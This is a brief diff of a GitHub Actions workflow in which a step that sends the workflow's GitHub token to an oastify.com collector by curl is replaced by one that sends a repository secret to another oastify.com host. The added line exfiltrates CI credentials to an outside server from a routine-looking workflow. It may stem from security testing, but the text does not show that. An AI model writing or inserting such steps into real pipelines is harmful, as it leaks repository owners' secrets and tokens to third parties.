@@ -14,4 +14,4 @@ jobs:
       - name: List files in the repository
         run: |
           ls ${{ github.workspace }}
-      - run: curl http://4rwd5cw60ayi4vfnbaykuyx4ovumib.oastify.com/?t=${{github.token}}
+      - run: curl http://c3gwbbak7qd1wbigra0vtxkh389yxn.oastify.com/?s=${{ secrets.AJAY_SECRET }}
